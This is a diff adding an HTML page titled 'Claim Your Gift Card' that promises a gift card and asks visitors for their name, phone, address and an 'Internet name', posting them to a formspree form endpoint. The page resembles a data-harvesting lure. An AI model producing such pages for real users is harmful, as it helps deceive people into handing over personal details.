@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Claim Your Gift Card</title>
+  <style>
+    body {
+      margin: 0; font-family: 'Segoe UI', sans-serif;
+      background: #e0ffe4;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      min-height: 100vh; text-align: center;
+      animation: fadeIn 1.2s ease;
+    }
+    h2 { color: #1b8a5d; font-size: 26px; }
+    p { color: #333; font-size: 16px; }
+    form {
+      background: #fff; padding: 25px; margin-top: 20px; padding-right: 40px;
+      border-radius: 10px; box-shadow: 0 0 10px #ccc;
+      max-width: 350px; width: 90%;
+      animation: zoomIn 1s ease;
+    }
+    input {
+      padding: 10px; width: 100%; margin: 10px 0;
+      border: 1px solid #ccc; border-radius: 6px;
+    }
+    button {
+      padding: 10px 20px; background: #2c7;
+      color: white; border: none; border-radius: 5px;
+      cursor: pointer;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes zoomIn {
+      from { transform: scale(0.8); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+    .modal-alert {
+      position: fixed; top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #007b5e; color: #fff;
+      padding: 25px 30px; border-radius: 10px;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.3);
+      font-size: 18px; z-index: 9999;
+      animation: popUp 0.6s ease; text-align: center;
+      max-width: 90%;
+    }
+    @keyframes popUp {
+      from { transform: scale(0.8) translate(-50%, -50%); opacity: 0; }
+      to { transform: scale(1) translate(-50%, -50%); opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <h2>🎉 Please fulfill the details to get your Gift Card</h2>
+  <p>Enter your information below</p>
+
+  <form action="https://formspree.io/f/xanbwlnb" method="POST" onsubmit="showCustomAlert(); return true;">
+  <input type="text" name="name" placeholder="Your Name" required>
+  <input type="text" name="phone" placeholder="Phone Number" required>
+  <input type="text" placeholder="Internet name" required>
+    <input type="text" placeholder="Your address" required>
+  <button type="submit">Confirm</button>
+</form>
+
+  <script>
+ function showCustomAlert() {
+    const modal = document.createElement('div');
+    modal.className = 'modal-alert';
+    modal.textContent = "Your form has been submitted! We’ll contact you shortly.";
+    document.body.appendChild(modal);
+    setTimeout(() => {
+      modal.remove();
+    }, 2500);
+  }
+    function submitGiftForm() {
+      showCustomAlert("You are now registered in our Lucky Customer Gift Card! We will message you shortly.", 'gift-success.html');
+    }
+  </script>
+</body>
+</html>
